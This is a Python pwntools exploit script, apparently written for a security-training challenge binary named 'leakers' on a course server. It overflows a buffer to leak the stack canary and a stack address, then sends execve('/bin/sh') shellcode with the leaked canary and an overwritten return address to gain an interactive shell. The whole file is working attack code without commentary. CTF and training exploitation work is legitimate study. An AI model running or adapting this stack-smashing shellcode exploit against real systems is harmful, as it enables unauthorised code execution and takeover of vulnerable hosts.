from pwn import *
import time
context.update(arch='amd64', os='linux')
context.terminal = ['tmux', 'splitw', '-h']

if "REMOTE" not in args:
    p = process("./leakers")
    gdb.attach(p, """
        # b *0x00401200
        # b *0x401232
        #b *0x00401223
         # b *0x00401223
        
        """)
    input("wait")
else:
    p = remote("bin.training.offdef.it", 2011)


stackstuff=b"B"*105
p.send(stackstuff)
time.sleep(0.1)
p.recvuntil(b"> ")
p.recv(105)
leaked_canary = b"\x00" + p.recv(7)
canary = u64(leaked_canary)
print("[!] leaked_canary %#x" % canary)

payload_to_leak_stack = b"B" * (104 + 6*8)  
p.send(payload_to_leak_stack)
time.sleep(0.1)
p.recvuntil(b"> ")
p.recv(104 + 6*8)  
leaked_stack= p.recv(6)
leaked_stack=leaked_stack.ljust(8,b"\x00")
stack = u64(leaked_stack)
print("stack leak: %#x" % stack)

delta = 0x182 
buffer_position = stack-delta
print("buffer: %#x" % buffer_position)

input("wait")
shellcode = b"\x90"*40+b"\xEB\x14\x5F\x48\x89\xFE\x48\x83\xC6\x08\x48\x89\xF2\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05\xE8\xE7\xFF\xFF\xFF/bin/sh\x00\x00\x00\x00\x00\x00\x00\x00\x00"
payload = shellcode.ljust(104, b"\x90") + p64(canary)+b"D"*8+ p64(buffer_position)
p.send(payload)
time.sleep(0.1)

p.send(b"\n")

p.interactive()

